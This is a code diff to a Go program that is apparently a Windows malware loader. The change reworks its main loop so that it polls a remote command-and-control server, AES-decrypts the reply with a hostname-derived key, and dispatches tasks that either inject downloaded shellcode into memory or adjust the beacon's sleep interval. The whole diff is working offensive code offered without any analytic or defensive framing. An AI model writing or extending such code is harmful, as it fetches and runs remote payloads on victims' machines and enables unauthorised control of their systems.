@@ -1,3 +1,5 @@
+//go:build windows
+
 package main
 
 import (
@@ -7,7 +9,6 @@ import (
 	_ "embed"
 	b64 "encoding/base64"
 	"encoding/hex"
-	"fmt"
 	"golang.org/x/sys/windows"
 	"strconv"
 	"strings"
@@ -42,24 +43,33 @@ func main() {
 			break
 		}
 	}
-	// if the response is not a shellcode, sleep and try again
 	for {
-		if len(body) > 10 {
-			break
-		}
-		t, _ := strconv.Atoi(string(body))
-		malwareUtil.Sleep(t)
 		body, err = malwareUtil.Request(cookieName, conf)
-		if err != nil || len(body) == 0 {
-			malwareUtil.Sleep(sleepTime)
+		// if the response is not a shellcode, sleep and try again
+		if len(body) < 10 {
+			t, _ := strconv.Atoi(string(body))
+			malwareUtil.Sleep(t)
+			if err != nil || len(body) == 0 {
+				malwareUtil.Sleep(sleepTime)
+			}
+		} else {
+			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
+			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
+			task, _ := malwareUtil.UnmarshalJSON(hexSc)
+			switch task.Tag {
+			case "shellcode":
+				shellcode, _ := hex.DecodeString(string(task.Payload))
+				//inject the shellcode
+				inject(shellcode)
+				return
+			case "sleep":
+				//fmt.Println("sleeping", string(task.Payload))
+				sleepTime, _ = strconv.Atoi(string(task.Payload))
+				malwareUtil.Sleep(sleepTime)
+			}
 		}
-		fmt.Println(body)
+		//fmt.Println(body)
 	}
-	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
-	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
-	shellcode, _ := hex.DecodeString(string(hexSc))
-	//inject the shellcode
-	inject(shellcode)
 }
 
 func inject(shellcode []byte) {
